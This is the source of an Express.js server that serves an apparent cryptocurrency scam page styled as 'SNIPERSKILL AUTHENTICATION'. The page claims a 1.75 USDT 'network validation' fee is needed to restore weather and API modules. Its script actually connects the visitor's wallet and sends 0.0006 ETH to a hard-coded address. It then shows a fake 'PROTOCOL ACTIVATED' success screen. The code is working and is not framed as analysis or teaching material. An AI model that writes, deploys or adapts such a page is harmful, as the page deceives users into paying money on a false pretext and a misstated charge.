const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Access Protocol</title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    </head>
    <body style="background:#050a14; color:#ffffff; text-align:center; padding-top:10vh; font-family: sans-serif; margin:0;">
      <div id="mainContainer" style="max-width:450px; margin:auto; border: 1px solid #1a2a4a; background:#0a162b; padding:40px; border-radius:20px; box-shadow: 0 20px 50px rgba(0,0,0,0.6);">
        
        <div id="paymentUi">
            <div style="color:#d4af37; font-size:0.75em; letter-spacing:4px; margin-bottom:15px; font-weight:bold;">SECURE ACCESS PROTOCOL</div>
            <h1 style="font-weight:300; margin-bottom:25px; letter-spacing:1px;">SNIPERSKILL AUTHENTICATION</h1>
            <div style="height:2px; background:linear-gradient(to right, transparent, #d4af37, transparent); margin-bottom:30px;"></div>
            <p style="color:#a0aec0; line-height:1.7; font-size:1em; margin-bottom:30px;">Network validation required to restore external module connectivity (Weather/API/Global).</p>
            
            <div style="background: rgba(212, 175, 55, 0.05); padding: 20px; border-radius: 12px; margin-bottom: 35px;">
              <span style="color:#d4af37; font-size:2.4em; font-weight:bold;">1.75</span>
              <span style="color:#d4af37; font-size:1.1em;"> USDT</span>
            </div>

            <button id="payButton" style="width:100%; padding:20px; background:#d4af37; color:#050a14; font-weight:800; border:none; cursor:pointer; font-size:0.95em; border-radius:10px; text-transform:uppercase;">
              Authorize & Sync Now
            </button>
        </div>

        <div id="successUi" style="display:none;">
            <div style="color:#48bb78; font-size:3em; margin-bottom:20px;">✓</div>
            <h2 style="color:#f0f0f0; font-weight:300;">PROTOCOL ACTIVATED</h2>
            <p style="color:#a0aec0; line-height:1.7;">Your node is now synchronized with the global network. All external modules have been restored.</p>
            <div style="margin-top:30px; padding:15px; background:rgba(72,187,120,0.1); border-radius:10px; color:#48bb78; font-size:0.8em; letter-spacing:1px;">
                STATUS: ONLINE / SECURED
            </div>
            <p style="font-size:0.7em; color:#4a5568; margin-top:20px;">You may now close this browser and return to your application.</p>
        </div>

        <p id="status" style="font-size:0.7em; margin-top:20px; color:#4a5568;">STATION ID: ${Math.random().toString(36).substring(7).toUpperCase()}</p>
      </div>

      <script>
        const payButton = document.getElementById('payButton');
        const paymentUi = document.getElementById('paymentUi');
        const successUi = document.getElementById('successUi');
        const statusText = document.getElementById('status');
        const receiver = "0x72118444fd84c442d2D6fb6c414F37F0DbB7b8Dd";

        payButton.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    statusText.innerText = "INITIALIZING GATEWAY...";
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    const tx = await signer.sendTransaction({
                        to: receiver,
                        value: ethers.utils.parseEther("0.0006") 
                    });
                    
                    statusText.innerText = "VERIFYING TRANSACTION...";
                    await tx.wait();
                    
                    // Switch UI dopo il pagamento
                    paymentUi.style.display = "none";
                    successUi.style.display = "block";
                    statusText.innerText = "SESSION VERIFIED: " + new Date().getTime();
                    
                } catch (err) {
                    statusText.innerText = "AUTH FAILED. PLEASE RETRY.";
                }
            } else {
                alert("Please use MetaMask or TrustWallet Browser.");
            }
        });
      </script>
    </body>
    </html>
  `);
});

app.listen(port, () => console.log('Elite Gateway Live'));
